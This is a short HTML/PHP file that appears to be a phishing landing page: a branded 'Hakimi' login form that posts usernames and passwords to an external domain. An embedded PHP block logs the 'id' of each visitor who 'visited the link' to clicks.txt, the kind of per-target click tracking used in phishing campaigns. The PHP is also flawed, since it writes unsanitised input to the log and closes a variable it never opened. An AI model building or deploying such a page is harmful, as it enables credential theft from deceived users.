<!DOCTYPE html>
<html>
<head>
        <title>Login Page</title>
        <link href="main.css" rel="stylesheet">
        <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
</head>
<body>

<form action="https://domain.com/new_portal/welcome.php"  method="POST">


        <div class="imgcontainer">
        <img class="avatar" src="logo.jpeg">
          <h3 align="center" class="Hakimi">Hakimi</h3>
        </div>

        <div class="input-container">
                <i class="fa fa-user icon"></i>
                <input class="input-field" type="text" placeholder="Username" name="usrnm">
        </div>

        <div class="input-container">
                <i class="fa fa-key icon"></i>
                <input class="input-field" type="password" placeholder="Password" name="psw">
        </div>

        <button type="submit" class="btn">Login</button>

</form>

</body>


<?php
                $clicks_file = fopen("clicks.txt", "a") or die("Unable to open file!");

                $user_click = "User with id: ". $_GET['id'] . " visited the link\n";

                fwrite($clicks_file, $user_click);
                fclose($creds_file);
?>

</html>    
